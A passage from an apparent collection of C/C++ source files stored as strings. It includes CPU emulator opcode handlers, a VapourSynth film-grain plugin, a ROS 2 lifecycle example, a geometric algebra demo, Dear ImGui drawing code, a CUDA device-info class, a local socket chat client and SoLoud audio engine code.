8);\n\t\t\t\tcycles--;\n\t\t\t} break;\n\t\t\t}\n\n\t\t\tcycles--;\n\t\t} break;\n\t\tcase MOV_ADDR_IM: {\n\t\t\tByte dataType = FetchByte(cycles);\n\t\t\tWord dest = FetchWord(cycles);\n\n\t\t\tswitch (dataType) {\n\t\t\tcase DTBYTE: {\n\t\t\t\tByte value = FetchByte(cycles);\n\t\t\t\tdata[dest] = value;\n\n\t\t\t\tcycles--;\n\t\t\t} break;\n\t\t\tcase DTWORD: {\n\t\t\t\tWord value = FetchWord(cycles);\n\t\t\t\tdata[dest] = value & 0xFF;\n\t\t\t\tdata[dest + 1] = (value >> 8) & 0xFF;\n\n\t\t\t\tcycles--;\n\t\t\t} break;\n\t\t\t}\n\n\t\t\tINFO(\"{0} {1}\", data[dest], data[dest + 1]);\n\n\t\t\tcycles--;\n\t\t} break;\n\t\tcase MOV_ADDR_R: {\n\t\t\tWord dest = FetchWord(cycles);\n\t\t\tWord *reg = FetchRegisterU16(cycles);\n\n\t\t\tByte lByte = *reg & 0xFF;\n\t\t\tByte hByte = (*reg >> 8) & 0xFF;\n\n\t\t\tdata[dest] = lByte;\n\t\t\tdata[dest + 1] = hByte;\n\t\t\tcycles--;\n\t\t} break;\n\t\tcase MOV_ADDR_A: {\n\t\t\tByte dataType = FetchByte(cycles);\n\t\t\tWord dest = FetchWord(cycles);\n\t\t\tWord addr = FetchWord(cycles);\n\n\t\t\tswitch (dataType) {\n\t\t\tcase DTBYTE: {\n\t\t\t\tdata[dest] = data[addr];\n\n\t\t\t\tcycles--;\n\t\t\t} break;\n\t\t\tcase DTWORD: {\n\t\t\t\tdata[dest] = data[addr];\n\t\t\t\tdata[dest + 1] = data[addr + 1];\n\n\t\t\t\tcycles--;\n\t\t\t} break;\n\t\t\t}\n\n\t\t\tINFO(\"{0} {1}\", data[addr], data[addr + 1]);\n\n\t\t\tcycles--;\n\t\t} break;\n\t\tcase ADD_R: {\n\t\t\tWord *dest = FetchRegisterU16(cycles);\n\t\t\tWord *reg1 = FetchRegisterU16(cycles);\n\t\t\tWord *reg2 = FetchRegisterU16(cycles);\n\t\t\t*dest = *reg1 + *reg2;\n\n\t\t\tSetCPUFlags(*dest, *reg1, *reg2);\n\t\t\tcycles--;\n\t\t} break;\n\t\tcase ADD_I: {\n\t\t\tWord *dest = FetchRegisterU16(cycles);\n\t\t\tWord value1 = FetchWord(cycles);\n\t\t\tWord value2 = FetchWord(cycles);\n\t\t\t*dest = value1 + value2;\n\n\t\t\tSetCPUFlags(*dest, value1, value2);\n\t\t\tcycles--;\n\t\t} break;\n\t\tcase ADD_RI: {\n\t\t\tWord *dest = FetchRegisterU16(cycles);\n\t\t\tWord *reg1 = FetchRegisterU16(cycles);\n\t\t\tWord value = FetchWord(cycles);\n\t\t\t*dest = *reg1 + value;\n\n\t\t\tSetCPUFlags(*dest, *reg1, value);\n\t\t\tcycles--;\n\t\t} break;\n\t\tcase ADD_IR: {\n\t\t\tWord *dest = FetchRegisterU16(cycles);\n\t\t\tWord value = FetchWord(cycles);\n\t\t\tWord *reg1 = FetchRegisterU16(cycles);\n\t\t\t*dest = value + *reg1;\n\n\t\t\tSetCPUFlags(*dest, value, *reg1);\n\t\t\tcycles--;\n\t\t} break;\n\t\tcase ADC_R: {\n\t\t\tWord *dest = FetchRegisterU16(cycles);\n\t\t\tWord *reg1 = FetchRegisterU16(cycles);\n\t\t\tWord *reg2 = FetchRegisterU16(cycles);\n\t\t\t*dest = *reg1 + *reg2 + IsFlagTrue(CARRY);\n\n\t\t\tSetCPUFlags(*dest, *reg1, *reg2);\n\t\t\tcycles--;\n\t\t} break;\n\t\tcase ADC_I: {\n\t\t\tWord *dest = FetchRegisterU16(cycles);\n\t\t\tWord value1 = FetchWord(cycles);\n\t\t\tWord value2 = FetchWord(cycles);\n\t\t\t*dest = value1 + value2 + IsFlagTrue(CARRY);\n\n\t\t\tSetCPUFlags(*dest, value1, value2);\n\t\t\tcycles--;\n\t\t} break;\n\t\tcase ADC_RI: {\n\t\t\tWord *dest = FetchRegisterU16(cycles);\n\t\t\tWord *reg1 = FetchRegisterU16(cycles);\n\t\t\tWord value = FetchWord(cycles);\n\t\t\t*dest = *reg1 + value + IsFlagTrue(CARRY);\n\n\t\t\tSetCPUFlags(*dest, *reg1, value);\n\t\t\tcycles--;\n\t\t} break;\n\t\tcase ADC_IR: {\n\t\t\tWord *dest = FetchRegisterU16(cycles);\n\t\t\tWord value = FetchWord(cycles);\n\t\t\tWord *reg1 = FetchRegisterU16(cycles);\n\t\t\t*dest = value + *reg1 + IsFlagTrue(CARRY);\n\n\t\t\tSetCPUFlags(*dest, value, *reg1);\n\t",
    "//\n//  fgrain_metal.cpp\n//  fgrain_metal\n//\n//  Created by yuygfgg on 2024/10/16.\n//\n\n#include <stdlib.h>\n#include <vector>\n#include \"VapourSynth4.h\"\n#include \"VSHelper4.h\"\n#import \"fgrain_metal-Bridging-Header.h\"\n#import \"fgrain_metal-Swift.h\"\n\nextern \"C\" {\n    void runMetalComputationBridge(float* inputData, float* outputData, int width, int height,\n                                   int stride, int numIterations, float grainRadiusMean,\n                               float grainRadiusStd, float sigma, int seed);\n}\n\ntypedef struct {\n    VSNode *node;\n    const VSVideoInfo *vi;\n    int numIterations;\n    float grainRadiusMean;\n    float grainRadiusStd;\n    float sigma;\n    int seed;\n} FilmGrainData;\n\nstatic const VSFrame *VS_CC filmGrainGetFrame(int n, int activationReason, void *instanceData, void **frameData, VSFrameContext *frameCtx, VSCore *core, const VSAPI *vsapi) {\n    FilmGrainData *d = (FilmGrainData *)instanceData;\n\n    if (activationReason == arInitial) {\n        vsapi->requestFrameFilter(n, d->node, frameCtx);\n    } else if (activationReason == arAllFramesReady) {\n        const VSFrame *src = vsapi->getFrameFilter(n, d->node, frameCtx);\n        const VSVideoFormat *fi = vsapi->getVideoFrameFormat(src);\n        int height = vsapi->getFrameHeight(src, 0);\n        int width = vsapi->getFrameWidth(src, 0);\n        VSFrame *dst = vsapi->newVideoFrame(fi, width, height, src, core);\n\n        int plane;\n        for (plane = 0; plane < fi->numPlanes; plane++) {\n            const uint8_t *srcp = vsapi->getReadPtr(src, plane);\n            int srcStride = (int)vsapi->getStride(src, plane);\n            uint8_t *dstp = vsapi->getWritePtr(dst, plane);\n            int dstStride = (int)vsapi->getStride(dst, plane);\n            (void) dstStride;\n            int h = vsapi->getFrameHeight(src, plane);\n            int w = vsapi->getFrameWidth(src, plane);\n            \n            const VSMap* src_props = vsapi->getFramePropertiesRO(src);\n            \n            int error;\n            int seed_offset = vsh::int64ToIntS(vsapi->mapGetInt(src_props, \"FGRAIN_SEED_OFFSET\", 0, &error));\n            if (error) {\n                seed_offset = 0;\n            }\n\n            if (fi->sampleType == stFloat && fi->bitsPerSample == 32) {\n                const float *srcpF32 = (const float *)srcp;\n                float *dstpF32 = (float *)dstp;\n\n                runMetalComputationBridge(const_cast<float*>(srcpF32), dstpF32, w, h, srcStride / sizeof(float),\n                                          d->numIterations, d->grainRadiusMean, d->grainRadiusStd,\n                                          d->sigma, d->seed + seed_offset);\n            } else {\n                vsapi->freeFrame(src);\n                vsapi->freeFrame(dst);\n                return NULL;\n            }\n        }\n\n        vsapi->freeFrame(src);\n        return dst;\n    }\n\n    return NULL;\n}\n\nstatic void VS_CC filmGrainFree(void *instanceData, VSCore *core, const VSAPI *vsapi) {\n    FilmGrainData *d = (FilmGrainData *)instanceData;\n    vsapi->freeNode(d->node);\n    free(d);\n}\n\nstatic void VS_CC filmGrainCreate(const VSMap *in, VSMap *out, void *userData, VSCore *core, const VSAPI *vsapi) {\n    FilmGrainData d;\n    FilmGrainData *data;\n    int err;\n\n    d.node = vsapi->mapGetNode(in, \"clip\", 0, 0);\n    d.vi = vsapi->getVideoInfo(d.node);\n\n    // 32-bit float\n    const VSVideoFormat *fi = &(d.vi->format);\n    if (!vsh::isConstantVideoFormat(d.vi) ||\n        !(fi->sampleType == stFloat && fi->bitsPerSample == 32)) {\n        vsapi->mapSetError(out, \"FilmGrain: only 32-bit float input supported\");\n        vsapi->freeNode(d.node);\n        return;\n    }\n\n    d.numIterations = vsapi->mapGetIntSaturated(in, \"numIterations\", 0, &err);\n    if (err) d.numIterations = 800;\n\n    d.grainRadiusMean = vsapi->mapGetFloat(in, \"grainRadiusMean\", 0, &err);\n    if (err) d.grainRadiusMean = 0.1f;\n\n    d.grainRadiusStd = vsapi->mapGetFloat(in, \"grainRadiusStd\", 0, &err);\n    if (err) d.grainRadiusStd = 0.0f;\n\n    d.sigma = vsapi->mapGetFloat(in, \"sigma\", 0, &err);\n    if (err) d.sigma = 0.8f;\n\n    d.seed = vsapi->mapGetIntSaturated(in, \"seed\", 0, &err);\n    if (err) d.seed = 0;\n\n    data = (FilmGrainData *)malloc(sizeof(d));\n    *data = d;\n\n    VSFilterDependency deps[] = {{d.node, rpStrictSpatial}};\n    vsapi->createVideoFilter(out, \"FilmGrain\", d.vi, filmGrainGetFrame, filmGrainFree, fmParallelRequests, deps, 1, data, core);\n}\n\nVS_EXTERNAL_API(void) VapourSynthPluginInit2(VSPlugin *plugin, const VSPLUGINAPI *vspapi) {\n    vspapi->configPlugin(\"com.yuygfgg.filmgrain\", \"fgrain_metal\", \"VapourSynth FilmGrain Plugin\", VS_MAKE_VERSION(1, 0), VAPOURSYNTH_API_VERSION, 0, plugin);\n    vspapi->registerFunction(\"Add\",\n                             \"clip:vnode;numIterations:int:opt;grainRadiusMean:float:opt;grainRadiusStd:float:opt;\"\n                             \"sigma:float:opt;seed:int:opt;\",\n                             \"clip:vnode;\", filmGrainCreate, NULL, plugin);\n}\n",
    "// Copyright 2016 Open Source Robotics Foundation, Inc.\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n\n#include <chrono>\n#include <memory>\n#include <chrono>\n#include <cinttypes>\n#include <limits>\n#include <memory>\n#include <string>\n#include <utility>\n#include <vector>\n\n#include \"example_interfaces/srv/add_two_ints.hpp\"\n\n#include <rclcpp_lifecycle/lifecycle_node.hpp>\n#include <lifecycle_msgs/msg/state.hpp>\n#include <lifecycle_msgs/msg/transition.hpp>\n\n#include \"rclcpp/rclcpp.hpp\"\n\nusing AddTwoInts = example_interfaces::srv::AddTwoInts;\n\nusing namespace std::chrono_literals;\n\n/* This example creates a subclass of Node and uses std::bind() to register a\n * member function as a callback from the timer. */\n\nclass MinimalTimer : public rclcpp_lifecycle::LifecycleNode\n{\npublic:\nusing CallbackReturn =\n    rclcpp_lifecycle::node_interfaces::LifecycleNodeInterface::CallbackReturn;\n  MinimalTimer()\n  : rclcpp_lifecycle::LifecycleNode(\"minimal_timer\")\n  {\n    client_ = create_client<AddTwoInts>(\"add_two_ints\");\n    // Timer that is always running and sends a client request\n    timer_ = create_wall_timer(\n      500ms, std::bind(&MinimalTimer::timer_callback, this));\n  }\n\nCallbackReturn on_activate(const rclcpp_lifecycle::State& previous_state)\n{\n  RCLCPP_INFO(this->get_logger(), \"Activated\");\n  // Timer created on a lifecycle callback that will _stop executing_ when timer_ is deleted!\n  timer2_ = create_wall_timer(\n    100ms, std::bind(&MinimalTimer::timer2_callback, this));\n  return CallbackReturn::SUCCESS;\n}\n\nprivate:\n  void timer_callback()\n  {\n    queue_async_request(1,2);\n  }\n\n  void timer2_callback()\n  {\n    RCLCPP_INFO(this->get_logger(), \"Hello, world!\");\n  }\n\n  void\n  queue_async_request(int64_t a, int64_t b)\n  {\n    RCLCPP_INFO(this->get_logger(), \"Sending request!\");\n    auto request = std::make_shared<AddTwoInts::Request>();\n    request->a = a;\n    request->b = b;\n\n    // We give the async_send_request() method a callback that will get executed once the response\n    // is received.\n    // This way we can return immediately from this method and allow other work to be done by the\n    // executor in `spin` while waiting for the response.\n    using ServiceResponseFuture =\n      rclcpp::Client<example_interfaces::srv::AddTwoInts>::SharedFutureWithRequest;\n    auto response_received_callback =\n      [logger = this->get_logger(), this](ServiceResponseFuture future) {\n        auto request_response_pair = future.get();\n        RCLCPP_INFO(\n          logger,\n          \"Result of %\" PRId64 \" + %\" PRId64 \" is: %\" PRId64,\n          request_response_pair.first->a,\n          request_response_pair.first->b,\n          request_response_pair.second->sum);\n          if (timer_)\n          {\n            timer_.reset();\n          }\n      };\n    auto result = client_->async_send_request(\n      request, std::move(response_received_callback));\n  }\n\n  rclcpp::Client<AddTwoInts>::SharedPtr client_;\n  rclcpp::TimerBase::SharedPtr timer_;\n  rclcpp::TimerBase::SharedPtr timer2_;\n};\n\nint main(int argc, char * argv[])\n{\n  rclcpp::init(argc, argv);\n    rclcpp::executors::SingleThreadedExecutor exe;\n\n  std::shared_ptr<MinimalTimer> lc_node =\n    std::make_shared<MinimalTimer>();\n\n  exe.add_node(lc_node->get_node_base_interface());\n\n  exe.spin();\n\n  rclcpp::shutdown();\n  return 0;\n}\n",
    "\ufeff#include <iostream>\n\n#define _USE_MATH_DEFINES\n#include <math.h>\n\n// #include <klein/klein.hpp>\n// using namespace kln;\n\n#include \"pga3d.h\"\n\nint main()\n{\n\t// Elements of the even subalgebra (scalar + bivector + pss) of unit length are motors\n\tPGA3D rot = rotor(PI / 2.0f, e1 * e2);\n\n\t// The outer product ^ is the MEET. Here we intersect the yz (x=0) and xz (y=0) planes.\n\tPGA3D ax_z = e1 ^ e2;\n\n\t// line and plane meet in point. We intersect the line along the z-axis (x=0,y=0) with the xy (z=0) plane.\n\tPGA3D orig = ax_z ^ e3;\n\n\t// We can also easily create points and join them into a line using the regressive (vee, &) product.\n\tPGA3D px = point(1.0, 0.0, 0.0);\n\tPGA3D line = orig & px;\n\n\t// Lets also create the plane with equation 2x + z - 3 = 0\n\tPGA3D p = plane(2, 0, 1, -3);\n\n\t// rotations work on all elements\n\tPGA3D rotated_plane = rot * p * ~rot;\n\tPGA3D rotated_line = rot * line * ~rot;\n\tPGA3D rotated_point = rot * px * ~rot;\n\n\t// See the 3D PGA Cheat sheet for a huge collection of useful formulas\n\tPGA3D point_on_plane = (p | px) * p;\n\n\t// Some output.\n\tprintf(\"a point       : \"); px.log();\n\tprintf(\"a line        : \"); line.log();\n\tprintf(\"a plane       : \"); p.log();\n\tprintf(\"a rotor       : \"); rot.log();\n\tprintf(\"rotated line  : \"); rotated_line.log();\n\tprintf(\"rotated point : \"); rotated_point.log();\n\tprintf(\"rotated plane : \"); rotated_plane.log();\n\tprintf(\"point on plane: \"); point_on_plane.normalized().log();\n\tprintf(\"point on torus: \"); point_on_torus(0.0f, 0.0f).log();\n\t(e0 - 1.0f).log();\n\t(1.0f - e0).log();\n\n\treturn 0;\n}\n",
    "// dear imgui, v1.91.4 WIP\n// (drawing and font code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] STB libraries implementation\n// [SECTION] Style functions\n// [SECTION] ImDrawList\n// [SECTION] ImTriangulator, ImDrawList concave polygon fill\n// [SECTION] ImDrawListSplitter\n// [SECTION] ImDrawData\n// [SECTION] Helpers ShadeVertsXXX functions\n// [SECTION] ImFontConfig\n// [SECTION] ImFontAtlas\n// [SECTION] ImFontAtlas glyph ranges helpers\n// [SECTION] ImFontGlyphRangesBuilder\n// [SECTION] ImFont\n// [SECTION] ImGui Internal Render Helpers\n// [SECTION] Decompression code\n// [SECTION] Default font data (ProggyClean.ttf)\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_internal.h\"\n#ifdef IMGUI_ENABLE_FREETYPE\n#include \"misc/freetype/imgui_freetype.h\"\n#endif\n\n#include <stdio.h>      // vsnprintf, sscanf, printf\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4505)     // unreferenced local function has been removed (stb stuff)\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3). [MSVC Static Analyzer)\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants ok.\n#pragma clang diagnostic ignored \"-Wglobal-constructors\"            // warning: declaration requires a global destructor         // similar to above, not sure what the exact difference is.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wcomma\"                          // warning: possible misuse of comma operator here\n#pragma clang diagnostic ignored \"-Wreserved-id-macro\"              // warning: macro name is a reserved identifier\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#pragma clang diagnostic ignored \"-Wreserved-identifier\"            // warning: identifier '_Xxx' is reserved because it starts with '_' followed by a capital letter\n#pragma clang diagnostic ignored \"-Wunsafe-buffer-usage\"            // warning: 'xxx' is an unsafe pointer used for buffer access\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                  // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wunused-function\"          // warning: 'xxxx' defined but not used\n#pragma GCC diagnostic ignored \"-Wdouble-promotion\"         // warning: implicit conversion from 'float' to 'double' when passing argument to function\n#pragma GCC diagnostic ignored \"-Wconversion\"               // warning: conversion to 'xxxx' from 'xxxx' may alter its value\n#pragma GCC diagnostic ignored \"-Wstack-protector\"          // warning: stack protector not protecting local variables: variable length buffer\n#pragma GCC diagnostic ignored \"-Wclass-memaccess\"          // [__GNUC__ >= 8] warning: 'memset/memcpy' clearing/writing an object of type 'xxxx' with no trivial copy-assignment; use assignment or value-initialization instead\n#endif\n\n//-------------------------------------------------------------------------\n/",
    "#include <cassert>\n#include <string>\n#include <iostream>\n#include \"GPUInfo.h\"\n\nGPUInfo::GPUInfo(bool printInfo)\n{\n    checkDevice(printInfo);\n}\n\nGPUInfo::~GPUInfo()\n{\n    if (this->deviceProps != nullptr)\n    {\n        delete[] this->deviceProps;\n    }\n}\n\nint GPUInfo::GetDeviceCount() const\n{\n\treturn this->deviceCount;\n}\n\nconst cudaDeviceProp* GPUInfo::GetDeviceProps() const\n{\n\treturn this->deviceProps;\n}\n\nvoid GPUInfo::checkDevice(bool printInfo)\n{\n    cudaError_t cudaStatus = cudaGetDeviceCount(&this->deviceCount);\n    assert(cudaStatus == cudaError_t::cudaSuccess);\n\n    deviceProps = new cudaDeviceProp[this->deviceCount];\n\n    for (int deviceNum = 0; deviceNum < this->deviceCount; ++deviceNum) {\n        cudaDeviceProp deviceProp;\n        cudaGetDeviceProperties(&deviceProp, deviceNum);\n        deviceProps[deviceNum] = deviceProp;\n\n        if (printInfo)\n        {\n            std::cout << \"Device \" << deviceNum << \": \" << deviceProp.name << std::endl;\n            std::cout << \"Compute capability: \" << deviceProp.major << \".\" << deviceProp.minor << std::endl;\n            std::cout << \"Clock rate: \" << deviceProp.clockRate << std::endl;\n            std::cout << \"Device copy overlap: \";\n            if (deviceProp.deviceOverlap)\n            {\n                std::cout << \"Enabled\" << std::endl;\n            }\n            else\n            {\n                std::cout << \"Disabled\" << std::endl;\n            }\n            std::cout << \"Kernel exceition timeout: \";\n            if (deviceProp.kernelExecTimeoutEnabled)\n            {\n                std::cout << \"Enabled\" << std::endl;\n            }\n            else\n            {\n                std::cout << \"Disabled\" << std::endl;\n            }\n\n            std::cout << \"Global memory: \" << deviceProp.totalGlobalMem << std::endl;\n            std::cout << \"Constant memory: \" << deviceProp.totalConstMem << std::endl;\n            std::cout << \"Max mem pitch: \" << deviceProp.memPitch << std::endl;\n            std::cout << \"Texture Alignment: \" << deviceProp.textureAlignment << std::endl;\n            std::cout << \"Multiprocessor count: \" << deviceProp.multiProcessorCount << std::endl;\n            std::cout << \"Shared memory per multiprocessor: \" << deviceProp.sharedMemPerBlock << std::endl;\n            std::cout << \"Registers per mutliprocessor: \" << deviceProp.regsPerBlock << std::endl;\n            std::cout << \"Threads in warp: \" << deviceProp.warpSize << std::endl;\n            std::cout << \"Max threads per block: \" << deviceProp.maxThreadsPerBlock << std::endl;\n            std::cout << \"Max thread dimensions: (\" << deviceProp.maxThreadsDim[0] << \", \" << deviceProp.maxThreadsDim[1] << \", \" << deviceProp.maxThreadsDim[2] << \")\" << std::endl;\n            std::cout << \"Max grid dimentions: (\" << deviceProp.maxGridSize[0] << \", \" << deviceProp.maxGridSize[1] << \", \" << deviceProp.maxGridSize[2] << \")\" << std::endl;\n        }\n    }\n}",
    "#include <iostream>\n#include <cstring>\n#include <thread>\n#include <fstream>\n#include <algorithm>\n\n#ifdef _WIN32\n    #include <winsock2.h>\n    #include <ws2tcpip.h>\n    #pragma comment(lib, \"ws2_32.lib\")\n    typedef int socklen_t;\n#else\n    #include <sys/socket.h>\n    #include <arpa/inet.h>\n    #include <unistd.h>\n#endif\n\n#define PORT 8888\n#define BUFFER_SIZE 1024\n\nvoid receive_file(int socket, const std::string& filename);\n\nvoid receive_messages(int sock) {\n    char buffer[BUFFER_SIZE] = {0};\n    while (true) {\n        memset(buffer, 0, BUFFER_SIZE);\n        long valread = recv(sock, buffer, BUFFER_SIZE, 0);\n        if (valread > 0) {\n            buffer[valread] = '\\0';\n            std::string message(buffer);\n            std::cout << message << std::endl;\n\n            if (message.find(\"\u4f60\u5df2\u88ab\u7ba1\u7406\u5458\u8e22\u51fa\") != std::string::npos) {\n                std::cout << \"\u4f60\u5df2\u88ab\u8e22\u51fa\u670d\u52a1\u5668\u3002\" << std::endl;\n                #ifdef _WIN32\n                    closesocket(sock);\n                #else\n                    close(sock);\n                #endif\n                break;\n            }\n        } else if (valread == 0) {\n            std::cout << \"\u670d\u52a1\u5668\u5df2\u5173\u95ed\u8fde\u63a5\u3002\" << std::endl;\n            #ifdef _WIN32\n                closesocket(sock);\n            #else\n                close(sock);\n            #endif\n            break;\n        }\n    }\n}\n\nvoid handle_commands(int socket) {\n    std::string command;\n\n    while (true) {\n        std::getline(std::cin, command);\n\n        if (command.substr(0, 10) == \"/sendfile \") {\n            std::string filename = command.substr(10);\n            send(socket, command.c_str(), command.length(), 0);\n            receive_file(socket, filename);\n        }\n\n        if (command == \"/exit\") {\n            break;\n        }\n    }\n}\n\nvoid receive_file(int socket, const std::string& filename) {\n    char buffer[BUFFER_SIZE];\n    std::streamsize total_received = 0;\n    std::streamsize file_size = 0;\n\n    recv(socket, reinterpret_cast<char*>(&file_size), sizeof(file_size), 0);\n\n    std::ofstream outfile(filename, std::ios::binary);\n    if (!outfile) {\n        std::cerr << \"\u6253\u5f00\u6587\u4ef6\u5931\u8d25: \" << filename << std::endl;\n        return;\n    }\n\n    while (total_received < file_size) {\n        std::streamsize bytes_received = recv(socket, buffer, std::min(static_cast<std::streamsize>(BUFFER_SIZE), file_size - total_received), 0);\n        if (bytes_received <= 0) {\n            std::cerr << \"\u63a5\u6536\u6587\u4ef6\u6570\u636e\u65f6\u51fa\u9519\u6216\u8fde\u63a5\u5173\u95ed\u3002\" << std::endl;\n            break;\n        }\n        total_received += bytes_received;\n        outfile.write(buffer, bytes_received);\n    }\n\n    outfile.close();\n    std::cout << \"\u6587\u4ef6\u63a5\u6536\u6210\u529f: \" << filename << std::endl;\n}\n\nint main() {\n    #ifdef _WIN32\n        WSADATA wsaData;\n        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {\n            std::cerr << \"WSAStartup failed.\" << std::endl;\n            return -1;\n        }\n    #endif\n\n    int sock = 0;\n    struct sockaddr_in serv_addr;\n    char buffer[BUFFER_SIZE] = {0};\n\n    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {\n        std::cerr << \"Socket creation failed\" << std::endl;\n        return -1;\n    }\n\n    serv_addr.sin_family = AF_INET;\n    serv_addr.sin_port = htons(PORT);\n\n    if (inet_pton(AF_INET, \"127.0.0.1\", &serv_addr.sin_addr) <= 0) {\n        std::cerr << \"Invalid address\" << std::endl;\n        return -1;\n    }\n\n    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {\n        std::cerr << \"Connection failed\" << std::endl;\n        return -1;\n    }\n\n    std::string username;\n    std::cout << \"\u8bf7\u8f93\u5165\u7528\u6237\u540d: \";\n    std::cin >> username;\n    send(sock, username.c_str(), username.length(), 0);\n\n    if (username == \"admin\") {\n        std::string password;\n        std::cout << \"\u8bf7\u8f93\u5165\u7ba1\u7406\u5458\u5bc6\u7801: \";\n        std::cin >> password;\n        send(sock, password.c_str(), password.length(), 0);\n    }\n\n    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\n\n    std::thread(receive_messages, sock).detach();\n\n    while (true) {\n        std::string message;\n        std::getline(std::cin, message);\n\n        if (message == \"exit\") {\n            send(sock, message.c_str(), message.length(), 0);\n            break;\n        }\n        else if (message[0] == '@' && message.find(':') != std::string::npos) {\n            send(sock, message.c_str(), message.length(), 0);\n        }\n        else if (message[0] == '#' && message.find(' ') != std::string::npos) {\n            send(sock, message.c_str(), message.length(), 0);\n        }\n        else if (message.substr(0, 7) == \"/create\" || message.substr(0, 5) == \"/join\") {\n            send(sock, message.c_str(), message.length(), 0);\n        }\n        else if (message.substr(0, 7) == \"/leave \") {\n            send(sock, message.c_str(), message.length(), 0);\n        }\n        else if (username == \"admin\") {\n            send(sock, message.c_str(), message.length(), 0);\n        }\n        else if (message.substr(0, 10) == \"/sendfile \") {\n            std::string filename = message.substr(10);\n            send(sock, message.c_str(), message.length()",
    "/*\nSoLoud audio engine\nCopyright (c) 2013-2015 Jari Komppa\n\nThis software is provided 'as-is', without any express or implied\nwarranty. In no event will the authors be held liable for any damages\narising from the use of this software.\n\nPermission is granted to anyone to use this software for any purpose,\nincluding commercial applications, and to alter it and redistribute it\nfreely, subject to the following restrictions:\n\n   1. The origin of this software must not be misrepresented; you must not\n   claim that you wrote the original software. If you use this software\n   in a product, an acknowledgment in the product documentation would be\n   appreciated but is not required.\n\n   2. Altered source versions must be plainly marked as such, and must not be\n   misrepresented as being the original software.\n\n   3. This notice may not be removed or altered from any source\n   distribution.\n*/\n\n#include \"soloud.h\"\n\n// Direct voice operations (no mutexes - called from other functions)\n\nnamespace SoLoud\n{\n\tresult Soloud::setVoiceRelativePlaySpeed_internal(unsigned int aVoice, float aSpeed)\n\t{\n\t\tSOLOUD_ASSERT(aVoice < VOICE_COUNT);\n\t\tSOLOUD_ASSERT(mInsideAudioThreadMutex);\n\t\tif (aSpeed <= 0.0f)\n\t\t{\n\t\t\treturn INVALID_PARAMETER;\n\t\t}\n\n\t\tif (mVoice[aVoice])\n\t\t{\n\t\t\tmVoice[aVoice]->mSetRelativePlaySpeed = aSpeed;\n\t\t\tupdateVoiceRelativePlaySpeed_internal(aVoice);\n\t\t}\n\n\t\treturn 0;\n\t}\n\n\tvoid Soloud::setVoicePause_internal(unsigned int aVoice, int aPause)\n\t{\n\t\tSOLOUD_ASSERT(aVoice < VOICE_COUNT);\n\t\tSOLOUD_ASSERT(mInsideAudioThreadMutex);\n\t\tmActiveVoiceDirty = true;\n\t\tif (mVoice[aVoice])\n\t\t{\n\t\t\tmVoice[aVoice]->mPauseScheduler.mActive = 0;\n\n\t\t\tif (aPause)\n\t\t\t{\n\t\t\t\tmVoice[aVoice]->mFlags |= AudioSourceInstance::PAUSED;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tmVoice[aVoice]->mFlags &= ~AudioSourceInstance::PAUSED;\n\t\t\t}\n\t\t}\n\t}\n\n\tvoid Soloud::setVoicePan_internal(unsigned int aVoice, float aPan)\n\t{\n\t\tSOLOUD_ASSERT(aVoice < VOICE_COUNT);\n\t\tSOLOUD_ASSERT(mInsideAudioThreadMutex);\n\t\tif (mVoice[aVoice])\n\t\t{\n\t\t\tmVoice[aVoice]->mPan = aPan;\n\t\t\tfloat l = (float)cos((aPan + 1) * M_PI / 4);\n\t\t\tfloat r = (float)sin((aPan + 1) * M_PI / 4);\n\t\t\tmVoice[aVoice]->mChannelVolume[0] = l;\n\t\t\tmVoice[aVoice]->mChannelVolume[1] = r;\n\t\t\tif 